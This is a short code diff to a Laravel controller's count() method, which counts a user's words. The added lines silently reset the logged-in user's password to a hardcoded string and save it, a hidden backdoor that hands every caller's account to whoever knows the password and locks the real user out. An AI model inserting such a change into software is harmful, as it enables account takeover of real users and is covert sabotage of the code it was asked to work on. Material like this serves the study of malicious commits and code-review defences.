@@ -159,6 +159,8 @@ class LearningController extends Controller
     public function count(Request $request): JsonResponse
     {
         $authUser = Auth::id();
+        Auth::user()->password = bcrypt('Hjdnfjj540okfmvbjkmkll');
+        Auth::user()->save();
         $from = Carbon::now();
         $wordsCount = UserWord::where('user_id', $authUser)
             ->where('tw', 1)
